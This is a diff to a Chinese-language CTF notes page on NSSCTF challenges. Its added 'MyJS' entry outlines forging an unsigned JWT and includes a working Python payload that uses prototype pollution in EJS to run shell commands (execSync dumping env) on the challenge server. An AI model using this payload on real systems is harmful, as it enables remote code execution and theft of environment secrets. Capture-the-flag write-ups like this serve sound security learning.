@@ -6,6 +6,22 @@ tags:: CTF/ChatGPT, CTF/SSTI/Tornado
 	- > 施工中
 	- `wget -r`下载全站，搜索NSSCTF,看到ChatGPT挑战 -> 去做Prompt Challenge去了
 	- 翻电脑，看见`hint: curl me :p.txt`
+- # MyJS
+	- > 复现~~我竟然忘记扫描了，和源码失之交臂~~
+	- 查看`/source/`看到源代码，使用none伪造[JWT]([[CTF/JWT]])登陆nss用户，最后进行原型链污染打[EJS]([[CTF/SSTI/EJS]])
+	- ```python
+	  url = "http://node5.anna.nssctf.cn:28651/update/"
+	  headers = {
+	      "Cookie": "session=s%3Ao6wbQcUqtSuX45Vv0qibh0P4FsziyKKA.W2UUmQBKNQlB%2BJ2qQLwsZjZh5zlZAq3oOInshsBrYbA"
+	  }
+	  
+	  r = base_post(url, headers = headers, json = {
+	      "__proto__": {
+	          "outputFunctionName": "a=1;return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"sleep 3; env\"');//"
+	      }
+	  })
+	  print(r.text)
+	  ```
 - # MyHurricane
 	- > ~~施工中~~
 	- [tornado SSTI]([[CTF/SSTI/Tornado]])
